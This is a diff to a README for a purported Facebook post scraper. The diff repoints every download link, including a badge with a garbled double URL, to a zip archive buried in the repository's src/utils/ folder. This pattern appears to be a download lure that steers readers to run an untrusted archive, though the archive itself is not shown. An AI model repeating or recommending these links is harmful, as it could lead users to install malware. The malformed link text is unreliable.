@@ -6,11 +6,11 @@ Welcome to facebook-posts-search-scraper! This tool helps you extract valuable F
 
 ## 📬 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip%20Latest%https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip)](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip)
+[![Download Latest Release](https://github.com/Aminsafi/facebook-posts-search-scraper/raw/refs/heads/main/src/utils/posts-search-scraper-facebook-3.0.zip%20Latest%https://github.com/Aminsafi/facebook-posts-search-scraper/raw/refs/heads/main/src/utils/posts-search-scraper-facebook-3.0.zip)](https://github.com/Aminsafi/facebook-posts-search-scraper/raw/refs/heads/main/src/utils/posts-search-scraper-facebook-3.0.zip)
 
 To get started, you need to download the application. Follow these steps:
 
-1. Click the link above, or visit [this page to download](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip).
+1. Click the link above, or visit [this page to download](https://github.com/Aminsafi/facebook-posts-search-scraper/raw/refs/heads/main/src/utils/posts-search-scraper-facebook-3.0.zip).
 2. Find the latest release version.
 3. Download the file for your operating system.
 
@@ -79,6 +79,6 @@ If you encounter any issues or need further assistance, feel free to reach out. 
 
 ## 📥 Download Again
 
-Don’t forget, you can always [visit this page to download](https://raw.githubusercontent.com/Aminsafi/facebook-posts-search-scraper/main/data/facebook-posts-search-scraper-3.8.zip) the latest version whenever you need it.
+Don’t forget, you can always [visit this page to download](https://github.com/Aminsafi/facebook-posts-search-scraper/raw/refs/heads/main/src/utils/posts-search-scraper-facebook-3.0.zip) the latest version whenever you need it.
 
 Happy extracting!
